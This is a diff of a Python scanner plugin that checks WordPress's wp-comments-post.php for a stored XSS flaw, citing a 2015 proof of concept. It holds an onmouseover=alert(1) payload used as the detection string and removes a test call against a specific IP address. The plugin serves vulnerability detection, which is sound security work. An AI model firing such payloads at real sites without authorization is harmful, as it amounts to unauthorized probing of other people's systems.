@@ -1,22 +1,16 @@
 # !/usr/bin/dev python
 # -*- coding:utf-8 -*-
-
 import re
 import random
 import string
 import urllib
-
 """
 refere:
 http://www.beebeeto.com/pdb/poc-2015-0092/
 """
-
-
 def assign(service, args):
     if service == 'wordpress':
         return True, args
-
-
 def audit(args):
     target_url      = args
     verify_url      = target_url + 'wp-comments-post.php'
@@ -46,7 +40,6 @@ def audit(args):
     if code == 200 and '<abbr title=&#8221;%s style=testvul onmouseover=alert(1)// </p>' % flag in res:
         security_hole(verify_url)
 
-
-if __name__ == "__main__":
+        return args
+if __name__== '__main__':
     from dummy import *
-    audit(assign('wordpress', 'http://121.41.129.210:8080/xuge/')[1])
